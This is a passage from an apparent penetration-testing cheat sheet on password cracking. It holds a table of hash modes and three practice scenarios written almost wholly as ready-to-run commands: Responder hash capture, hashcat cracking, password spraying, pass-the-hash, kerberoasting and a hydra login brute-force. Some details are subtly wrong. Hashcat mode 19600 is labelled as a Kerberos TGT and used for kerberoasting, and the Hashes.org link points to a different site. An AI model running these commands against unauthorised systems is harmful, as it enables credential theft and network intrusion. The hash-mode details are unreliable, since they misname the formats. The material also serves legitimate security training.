crackmapexec ldap 192.168.1.50 -u users.txt -p passwords.txt --kerberoasting output.txt
```

### Common Hash Modes

| Hash Type | Hashcat -m | John --format |
|-----------|------------|---------------|
| MD5 | 0 | raw-md5 |
| SHA1 | 100 | raw-sha1 |
| SHA256 | 1400 | raw-sha256 |
| SHA512 | 1700 | raw-sha512 |
| NTLM | 1000 | nt |
| NTLMv1 | 5500 | netntlm |
| NTLMv2 | 5600 | netntlmv2 |
| bcrypt | 3200 | bcrypt |
| WPA/WPA2 | 2500 | wpapsk |
| Kerberos TGT | 19600 | krb5tgs |
| Kerberos TGS | 19700 | krb5tgs |
| SHA512crypt | 1800 | sha512crypt |

---

## Practice Scenarios 🎯

### Scenario 1: Active Directory Engagement

```bash
# 1. Capture NTLMv2 hashes with Responder
responder -I eth0 -wrf

# 2. Save hashes to file
# hashes.txt contains NTLMv2

# 3. Crack with Hashcat
hashcat -m 5600 -a 0 hashes.txt rockyou.txt -r best64.rule

# 4. If cracked, use for lateral movement
crackmapexec smb 192.168.1.0/24 -u user -p 'cracked_password'
```

### Scenario 2: Web Application Penetration Test

```bash
# 1. Dump password hashes from database
# SELECT username, password FROM users;

# 2. Identify hash type
hashid password_hashes.txt

# 3. Crack with Hashcat
hashcat -m 1400 -a 0 sha256_hashes.txt rockyou.txt

# 4. Try default credentials on web app
hydra -L users.txt -P rockyou.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid" target.com
```

### Scenario 3: Internal Network Assessment

```bash
# 1. Password spray common password
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Welcome123'

# 2. For successful logins, try pass-the-hash
crackmapexec smb 192.168.1.0/24 -u admin -H 'HASH' --local-auth

# 3. Kerberoast service accounts
crackmapexec ldap 192.168.1.50 -u users.txt -p passwords.txt --kerberoasting kerb_hashes.txt

# 4. Crack Kerberos hashes
hashcat -m 19600 -a 0 kerb_hashes.txt rockyou.txt
```

---

## Additional Resources

- **Hashcat Wiki**: https://hashcat.net/wiki/
- **John the Ripper Wiki**: https://github.com/openwall/john/wiki
- **SecLists Passwords**: https://github.com/danielmiessler/SecLists/tree/master/Passwords
- **Weakpass Wordlists**: https://weakpass.com/
- **Hashes.org**: https://hashes.com/
- **CrackStation**: https://crackstation.net/ (online hash cracking)

---

*Last updated: 2026-05-03*
*Version: 1.0*
*Author: clawd 🦞*
